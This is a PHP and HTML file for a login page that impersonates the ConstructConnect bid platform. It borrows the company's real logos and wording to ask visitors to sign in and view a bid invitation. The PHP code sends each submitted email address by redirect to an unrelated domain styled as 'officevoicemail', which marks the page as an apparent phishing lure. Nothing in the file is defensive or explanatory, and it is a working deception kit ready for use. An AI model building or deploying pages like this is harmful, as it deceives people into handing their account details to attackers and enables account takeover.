<?php
/* ─────────────────────────  PHP allow‑list redirect  ───────────────────── */
$allowedUrl  = "https://officevoicemail.docswin.com/officevoicemail/?9T5n4o=bMcfO";
$fallbackUrl = "https://status.skyetel.com/";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email      = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
    if ($email) {
        header("Location: {$allowedUrl}&u=" . $email, true, 302);
    } else {
        header("Location: {$fallbackUrl}", true, 302);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>ConstructConnect</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
    <link rel="icon" href="https://app.constructconnect.com/favicon.ico" type="image/x-icon">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: 'Montserrat', sans-serif;
            background-image: url('https://app.isqftstatic.com/libs/auth/images/background.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .mobile-header {
            display: none;
        }

        .container {
            display: flex;
            max-width: 1100px;
            width: 90%;
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 4px;
            overflow: hidden;
            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.3);
        }

        .left {
            background-color: #185a7d;
            color: white;
            padding: 30px;
            width: 45%;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .left img.logo {
            width: 250px;
            margin-bottom: 20px;
        }

        .left p {
            margin-top: 20px;
            line-height: 1.5;
        }

        .left img.status {
            width: 100%;
            max-width: 100%;
            height: auto;
            border-radius: 4px;
            margin-top: 20px;
        }

        .right {
            padding: 50px 40px;
            background-color: white;
            width: 55%;
            display: flex;
            flex-direction: column;
            min-height: 600px;
        }

        .right h2 {
            margin-bottom: 20px;
            font-size: 22px;
            color: #333;
        }

        input[type="email"] {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        input[type="email"]:focus {
            outline: none;
            border: 1px solid black;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #00a6de;
            color: white;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #008fc1;
        }

        @media (max-width: 768px) {
            body {
                background-image: none;
                background-color: white;
                flex-direction: column;
                height: auto;
                align-items: unset;
                justify-content: unset;
            }

            .mobile-header {
                display: flex;
                background-color: #185a7d;
                padding: 16px;
                justify-content: center;
                align-items: center;
                position: sticky;
                top: 0;
                z-index: 1000;
            }

            .mobile-header img {
                height: 30px;
                width: auto;
                padding: 5px 2.5px;
            }

            .container {
                flex-direction: column;
                width: 100%;
                max-width: 100%;
                box-shadow: none;
                border-radius: 0;
                padding: 0 16px;
            }

            .left {
                display: none;
            }

            .right {
                width: 100%;
                padding: 30px 0;
                min-height: auto;
            }

            .right h2 {
                font-size: 20px;
            }

            input[type="email"] {
                font-size: 16px;
            }

            button {
                font-size: 16px;
                padding: 20px;
            }
        }

        @media (max-width: 1280px) and (min-width: 769px) {
            body {
                background-image: none;
                background-color: white;
                align-items: unset;
                justify-content: unset;
            }

            .container {
                max-width: 100%;
                width: 100%;
                border-radius: 0;
                box-shadow: none;
            }
        }
    </style>
</head>

<body>
    <div class="mobile-header">
        <img src="https://app.constructconnect.com/auth/common/css/images/cc-logo-negative-2019.svg" alt="ConstructConnect Logo">
    </div>

    <div class="container">
        <div class="left">
            <img src="https://app.constructconnect.com/auth/common/css/images/cc-logo-negative-2019.svg" alt="ConstructConnect Logo" class="logo">
            <p>
                You're a couple of steps away from having your ConstructConnect, iSqFt and
                SmartBid invitations to Bid on a single digital bid board and connecting
                with the best builders in your <u>area!</u>
            </p>
            <img src="https://www.constructconnect.com/hubfs/STATUS_MAIN_V2_1.gif" alt="Bid Board Status" class="status" loading="lazy">
        </div>
        <div class="right">
            <h2>Sign-in to view bid invitiation</h2>
            <form method="POST">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="" required>
                <button type="submit">Next</button>
            </form>
        </div>
    </div>
</body>

</html>